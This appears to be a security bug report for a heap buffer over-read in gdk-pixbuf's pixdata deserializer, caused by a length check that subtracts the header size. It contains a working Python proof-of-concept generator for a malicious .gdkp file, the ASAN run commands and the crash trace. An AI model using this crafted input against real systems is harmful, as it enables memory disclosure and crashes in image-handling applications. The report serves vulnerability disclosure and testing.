## Bug0: Off-by-Header-Length Integer Check in gdk_pixdata_deserialize Enables Heap Buffer Overflow Read

In `gdk_pixdata_deserialize()` (gdk-pixdata.c, line 235), the length validation uses `stream_length < pixdata->length - GDK_PIXDATA_HEADER_LENGTH` instead of the correct `stream_length < pixdata->length`, allowing a crafted stream whose actual size is up to 24 bytes shorter than the declared length to pass the check and cause `gdk_pixbuf_from_pixdata()` to issue a `memcpy` reading tens of thousands of bytes past the end of the heap-allocated stream buffer.

### PoC

Craft a malicious image file using the Python script below and process it with the ASAN-instrumented gdk-pixbuf-pixdata binary to trigger the vulnerability.

```python
import struct

MAGIC = 0x47646b50  # "GdkP"

# RGBA + SAMPLE_WIDTH_8 + RAW encoding
# GDK_PIXDATA_COLOR_TYPE_RGBA   = 0x02
# GDK_PIXDATA_SAMPLE_WIDTH_8    = 0x01 << 16 = 0x010000
# GDK_PIXDATA_ENCODING_RAW      = 0x01 << 24 = 0x01000000
PIXDATA_TYPE_RGBA_RAW = 0x02 | 0x010000 | 0x01000000  # = 0x01010002

width = 100
height = 100
bpp = 4         # RGBA
rowstride = width * bpp  # = 400

# K = 24 (maximum bypass window): declare length = 48 (header 24 + 24 phantom bytes)
# but actual file is only 24 bytes (header only).
# Buggy check: stream_length(24) < pixdata->length(48) - 24 = 24 -> FALSE -> passes!
# Correct check: stream_length(24) < pixdata->length(48) = 48 -> TRUE -> would reject.
declared_length = 48

header = struct.pack(">IIIIII",
    MAGIC,
    declared_length,           # LIES: claims 24 extra bytes of pixel_data exist
    PIXDATA_TYPE_RGBA_RAW,     # RGBA, 8-bit samples, raw (no RLE)
    rowstride,                 # 400 bytes per row
    width,                     # 100
    height,                    # 100
)

# No pixel_data bytes - file stops after header
data = header   # exactly 24 bytes

with open("poc_input.gdkp", "wb") as f:
    f.write(data)
print(f"Generated poc_input.gdkp ({len(data)} bytes, "
      f"declared_length={declared_length}, "
      f"image={width}x{height} RGBA raw, "
      f"expected_pixel_data={rowstride * height} bytes)")
print(f"Attack: stream_length={len(data)} < declared({declared_length})-24={declared_length-24} -> "
      f"FALSE (bug bypassed) -> memcpy reads {rowstride*height} bytes past end!")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/gdk-pixbuf/build_test/bin/gdk-pixbuf-pixdata poc_input.gdkp /tmp/out.c || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x50c000000840 at pc 0x7febd6910397 bp 0x7ffecbd6f510 sp 0x7ffecbd6ecb8
READ of size 40000 at 0x50c000000840 thread T0
    #0 0x7febd6910396 in __interceptor_memcpy ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:827
    #1 0x7febd681a3ca in gdk_pixbuf_from_pixdata (libgdk_pixbuf-2.0.so.0+0xad3ca)

### Impact

An attacker can supply a crafted `.gdkp` image file that bypasses the stream-length guard in `gdk_pixdata_deserialize()` and causes `gdk_pixbuf_from_pixdata()` to read up to 40,000 bytes beyond the end of a heap-allocated buffer, enabling heap memory disclosure or a reliable denial-of-service crash. Any application that loads untrusted images via gdk-pixbuf's pixdata loader is exposed, including GNOME desktop components and third-party GTK applications. No authentication is required because the trigger is a passively received image file such as an email attachment, a web-fetched thumbnail, or a document embed.
